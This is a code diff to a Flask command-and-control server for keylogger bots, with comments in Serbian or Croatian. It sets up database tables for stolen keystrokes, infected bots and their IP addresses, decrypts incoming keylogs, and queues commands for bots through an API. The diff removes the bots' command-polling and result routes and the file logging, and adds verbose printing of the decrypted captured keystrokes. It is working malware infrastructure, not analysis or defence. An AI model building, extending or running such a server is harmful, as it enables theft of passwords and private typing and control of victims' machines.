@@ -26,7 +26,6 @@ CORS(app)
 
 # Logging setup
 logging.basicConfig(
-    filename='c2_operations.log',
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s'
 )
@@ -39,22 +38,31 @@ cipher = Fernet(MY_KEY)
 print(f"[+] Encryption key loaded: {MY_KEY[:20]}...")
 
 # =====================================================================
-# BAZA PODATAKA
+# BAZA PODATAKA - JEDNOSTAVNA IMPLEMENTACIJA
 # =====================================================================
+DB_PATH = 'c2_database.db'
+
 def init_db():
+    """Kreiraj bazu ako ne postoji"""
     try:
-        conn = sqlite3.connect('c2_database.db')
+        conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
+        
+        # Keylogs tabela
         c.execute('''CREATE TABLE IF NOT EXISTS keylogs
                      (id INTEGER PRIMARY KEY AUTOINCREMENT,
                       bot_id TEXT,
                       data TEXT,
                       timestamp TEXT)''')
+        
+        # Botovi tabela
         c.execute('''CREATE TABLE IF NOT EXISTS bots
                      (bot_id TEXT PRIMARY KEY,
                       first_seen TEXT,
                       last_seen TEXT,
                       ip_address TEXT)''')
+        
+        # Komande tabela
         c.execute('''CREATE TABLE IF NOT EXISTS commands
                      (id INTEGER PRIMARY KEY AUTOINCREMENT,
                       bot_id TEXT,
@@ -62,6 +70,7 @@ def init_db():
                       status TEXT,
                       result TEXT,
                       timestamp TEXT)''')
+        
         conn.commit()
         conn.close()
         print("[+] Database initialized successfully")
@@ -70,7 +79,7 @@ def init_db():
         print(f"[-] Database initialization error: {e}")
         return False
 
-# INICIJALIZACIJA BAZE PRI STARTU
+# INICIJALIZUJ BAZU
 init_db()
 
 # =====================================================================
@@ -83,122 +92,70 @@ def require_auth(f):
     def decorated(*args, **kwargs):
         auth_header = request.headers.get('Authorization')
         if not auth_header or auth_header != f'Bearer {AUTH_TOKEN}':
-            logging.warning(f"Unauthorized attempt from {request.remote_addr}")
             return jsonify({"status": "error", "message": "Unauthorized"}), 401
         return f(*args, **kwargs)
     return decorated
 
 # =====================================================================
-# HELPER FUNKCIJE
+# FUNKCIJE ZA BAZU
 # =====================================================================
 def save_keylog(bot_id, data, timestamp):
+    """Sačuvaj keylog u bazu"""
     try:
-        conn = sqlite3.connect('c2_database.db')
+        conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         c.execute("INSERT INTO keylogs (bot_id, data, timestamp) VALUES (?, ?, ?)",
                   (bot_id, data, timestamp))
         conn.commit()
         conn.close()
-        print(f"[+] Keylog saved for {bot_id}")
+        print(f"[+] KEYLOG SAVED: {bot_id} - {data[:30]}...")
         return True
     except Exception as e:
         print(f"[-] Error saving keylog: {e}")
         return False
 
 def save_bot(bot_id, timestamp, ip_address):
+    """Sačuvaj bot"""
     try:
-        conn = sqlite3.connect('c2_database.db')
+        conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         c.execute("INSERT OR REPLACE INTO bots (bot_id, first_seen, last_seen, ip_address) VALUES (?, ?, ?, ?)",
                   (bot_id, timestamp, timestamp, ip_address))
         conn.commit()
         conn.close()
-        print(f"[+] Bot saved: {bot_id}")
+        print(f"[+] BOT SAVED: {bot_id}")
         return True
     except Exception as e:
         print(f"[-] Error saving bot: {e}")
         return False
 
-def update_bot_last_seen(bot_id, timestamp):
-    try:
-        conn = sqlite3.connect('c2_database.db')
-        c = conn.cursor()
-        c.execute("UPDATE bots SET last_seen = ? WHERE bot_id = ?", (timestamp, bot_id))
-        conn.commit()
-        conn.close()
-        return True
-    except Exception as e:
-        print(f"[-] Error updating bot: {e}")
-        return False
-
-def get_recent_logs(limit=100):
-    try:
-        conn = sqlite3.connect('c2_database.db')
-        c = conn.cursor()
-        c.execute("SELECT bot_id, data, timestamp FROM keylogs ORDER BY id DESC LIMIT ?", (limit,))
-        logs = [{"bot": row[0], "data": row[1], "time": row[2]} for row in c.fetchall()]
-        conn.close()
-        return logs
-    except Exception as e:
-        print(f"[-] Error getting logs: {e}")
-        return []
-
 def get_all_bots():
+    """Dohvati sve botove"""
     try:
-        conn = sqlite3.connect('c2_database.db')
+        conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         c.execute("SELECT bot_id, first_seen, last_seen, ip_address FROM bots")
         bots = [{"bot_id": row[0], "first_seen": row[1], "last_seen": row[2], "ip": row[3]} for row in c.fetchall()]
         conn.close()
+        print(f"[*] Returning {len(bots)} bots")
         return bots
     except Exception as e:
         print(f"[-] Error getting bots: {e}")
         return []
 
-def save_command(bot_id, command):
+def get_recent_logs(limit=100):
+    """Dohvati zadnje logove"""
     try:
-        conn = sqlite3.connect('c2_database.db')
+        conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
-        timestamp = datetime.datetime.now().isoformat()
-        c.execute("INSERT INTO commands (bot_id, command, status, timestamp) VALUES (?, ?, ?, ?)",
-                  (bot_id, command, "pending", timestamp))
-        conn.commit()
-        command_id = c.lastrowid
+        c.execute("SELECT bot_id, data, timestamp FROM keylogs ORDER BY id DESC LIMIT ?", (limit,))
+        logs = [{"bot": row[0], "data": row[1], "time": row[2]} for row in c.fetchall()]
         conn.close()
-        return command_id
+        print(f"[*] Returning {len(logs)} logs")
+        return logs
     except Exception as e:
-        print(f"[-] Error saving command: {e}")
-        return None
-
-def get_pending_command(bot_id):
-    try:
-        conn = sqlite3.connect('c2_database.db')
-        c = conn.cursor()
-        c.execute("SELECT id, command FROM commands WHERE bot_id = ? AND status = 'pending' ORDER BY id ASC LIMIT 1",
-                  (bot_id,))
-        row = c.fetchone()
-        conn.close()
-        if row:
-            return {"id": row[0], "command": row[1]}
-        return None
-    except Exception as e:
-        print(f"[-] Error getting pending command: {e}")
-        return None
-
-def update_command_status(command_id, status, result=None):
-    try:
-        conn = sqlite3.connect('c2_database.db')
-        c = conn.cursor()
-        if result:
-            c.execute("UPDATE commands SET status = ?, result = ? WHERE id = ?", (status, result, command_id))
-        else:
-            c.execute("UPDATE commands SET status = ? WHERE id = ?", (status, command_id))
-        conn.commit()
-        conn.close()
-        return True
-    except Exception as e:
-        print(f"[-] Error updating command status: {e}")
-        return False
+        print(f"[-] Error getting logs: {e}")
+        return []
 
 # =====================================================================
 # RUTE
@@ -211,6 +168,7 @@ def dashboard():
 @require_auth
 def receive_keylog():
     try:
+        print("[*] ===== NEW KEYLOG REQUEST =====")
         data = request.get_json()
         if not data:
             return jsonify({"status": "error", "message": "No data"}), 400
@@ -219,115 +177,74 @@ def receive_keylog():
         log_data = data.get('data')
         timestamp = data.get('timestamp', datetime.datetime.now().isoformat())
         
+        print(f"[*] Bot ID: {bot_id}")
+        print(f"[*] Data: {log_data[:50]}...")
+        
         if not bot_id or not log_data:
             return jsonify({"status": "error", "message": "Missing fields"}), 400
         
-        # Dekodiraj i dekriptuj
+        # Dekodiraj
         decoded_log = None
         try:
             encrypted = base64.b64decode(log_data)
             decoded_log = cipher.decrypt(encrypted).decode('utf-8', errors='ignore')
-            print(f"[+] Decrypted successfully: {len(decoded_log)} chars from {bot_id}")
+            print(f"[+] Decrypted: {decoded_log}")
         except Exception as e:
             print(f"[-] Decryption error: {e}")
             try:
                 decoded_log = base64.b64decode(log_data).decode('utf-8', errors='ignore')
-                print(f"[+] Fallback: accepted unencrypted data from {bot_id}")
+                print(f"[+] Fallback: {decoded_log}")
             except:
                 decoded_log = str(log_data)
-                print(f"[+] Fallback: accepted raw data from {bot_id}")
+                print(f"[+] Raw: {decoded_log}")
         
-        # Sačuvaj u bazu
+        # SAČUVAJ U BAZU
+        print("[*] Saving to database...")
         save_keylog(bot_id, decoded_log, timestamp)
         save_bot(bot_id, timestamp, request.remote_addr)
-        update_bot_last_seen(bot_id, timestamp)
         
-        logging.info(f"Keylog received from {bot_id} ({len(decoded_log)} chars) from {request.remote_addr}")
-        print(f"[+] SUCCESS: Keylog from {bot_id} saved!")
-        
+        print(f"[+] ===== SUCCESS: Keylog from {bot_id} SAVED! =====")
         return jsonify({"status": "ok", "message": "Data received"}), 200
         
     except Exception as e:
-        logging.error(f"Error in receive_keylog: {e}")
-        print(f"[-] Error in receive_keylog: {e}")
-        return jsonify({"status": "error", "message": str(e)}), 500
-
-@app.route('/command', methods=['GET'])
-@require_auth
-def get_command():
-    try:
-        bot_id = request.args.get('id')
-        if not bot_id:
-            return jsonify({"status": "error", "message": "Missing bot_id"}), 400
-        
-        command = get_pending_command(bot_id)
-        if command:
-            return jsonify({
-                "status": "ok",
-                "command_id": command["id"],
-                "command": command["command"]
-            })
-        else:
-            return jsonify({"status": "ok", "command": None})
-    except Exception as e:
-        print(f"[-] Error in get_command: {e}")
-        return jsonify({"status": "error", "message": str(e)}), 500
-
-@app.route('/result', methods=['POST'])
-@require_auth
-def command_result():
-    try:
-        data = request.get_json()
-        command_id = data.get('command_id')
-        result = data.get('result')
-        status = data.get('status', 'completed')
-        
-        if not command_id:
-            return jsonify({"status": "error", "message": "Missing command_id"}), 400
-        
-        update_command_status(command_id, status, result)
-        logging.info(f"Command {command_id} completed with status: {status}")
-        
-        return jsonify({"status": "ok"})
-    except Exception as e:
-        logging.error(f"Error in command_result: {e}")
+        print(f"[-] ERROR: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
 # =====================================================================
-# API RUTE (za dashboard)
+# API RUTE
 # =====================================================================
-@app.route('/api/logs', methods=['GET'])
-def api_logs():
-    try:
-        logs = get_recent_logs(100)
-        print(f"[*] API logs: returning {len(logs)} logs")
-        return jsonify({"logs": logs})
-    except Exception as e:
-        print(f"[-] Error in api_logs: {e}")
-        return jsonify({"logs": [], "error": str(e)}), 500
-
 @app.route('/api/bots', methods=['GET'])
 def api_bots():
+    print("[*] API /bots called")
     try:
         bots = get_all_bots()
-        print(f"[*] API bots: returning {len(bots)} bots")
         return jsonify({"bots": bots})
     except Exception as e:
-        print(f"[-] Error in api_bots: {e}")
-        return jsonify({"bots": [], "error": str(e)}), 500
+        print(f"[-] Error: {e}")
+        return jsonify({"bots": []}), 500
+
+@app.route('/api/logs', methods=['GET'])
+def api_logs():
+    print("[*] API /logs called")
+    try:
+        logs = get_recent_logs(100)
+        return jsonify({"logs": logs})
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        return jsonify({"logs": []}), 500
 
 @app.route('/api/commands', methods=['GET'])
 def api_commands():
     try:
-        conn = sqlite3.connect('c2_database.db')
+        conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         c.execute("SELECT bot_id, command, status, timestamp FROM commands ORDER BY id DESC LIMIT 50")
         commands = [{"bot_id": row[0], "command": row[1], "status": row[2], "timestamp": row[3]} for row in c.fetchall()]
         conn.close()
         return jsonify({"commands": commands})
     except Exception as e:
-        print(f"[-] Error in api_commands: {e}")
-        return jsonify({"commands": [], "error": str(e)}), 500
+        print(f"[-] Error: {e}")
+        return jsonify({"commands": []}), 500
 
 @app.route('/api/send_command', methods=['POST'])
 @require_auth
@@ -340,18 +257,22 @@ def api_send_command():
         if not bot_id or not command:
             return jsonify({"status": "error", "message": "Missing fields"}), 400
         
-        command_id = save_command(bot_id, command)
-        if command_id:
-            logging.info(f"Command sent to {bot_id}: {command}")
-            return jsonify({"status": "ok", "command_id": command_id})
-        else:
-            return jsonify({"status": "error", "message": "Failed to save command"}), 500
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        timestamp = datetime.datetime.now().isoformat()
+        c.execute("INSERT INTO commands (bot_id, command, status, timestamp) VALUES (?, ?, ?, ?)",
+                  (bot_id, command, "pending", timestamp))
+        conn.commit()
+        command_id = c.lastrowid
+        conn.close()
+        
+        return jsonify({"status": "ok", "command_id": command_id})
     except Exception as e:
-        logging.error(f"Error in api_send_command: {e}")
+        print(f"[-] Error: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
 # =====================================================================
-# DASHBOARD TEMPLATE (ist kao prije)
+# DASHBOARD TEMPLATE
 # =====================================================================
 DASHBOARD_TEMPLATE = """
 <!DOCTYPE html>
